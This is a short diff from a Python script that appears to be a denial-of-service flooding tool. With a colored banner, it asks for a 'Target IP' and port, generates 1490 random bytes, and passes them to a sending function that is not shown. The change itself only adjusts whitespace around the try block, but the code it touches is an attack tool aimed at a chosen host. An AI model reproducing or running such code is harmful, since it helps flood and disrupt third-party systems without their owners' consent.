@@ -138,10 +138,11 @@ print(ip)
 time.sleep(2.5)
 print("\033[94m")
 #########################################################################
- try:
+
+try:
+    
     ip = input("\033[94m╔═══\033[91m[ Target IP ] •\n\033[94m╠══>\033[0m ")
     port = int(input("\033[94m╠═══\033[91m[ Enter PORT ] •\n\033[94m╠══>\033[0m "))
-	
     if not (ip == "" or port == ""):
       byte = _urandom(1490)
       req_send(ip,port,byte)
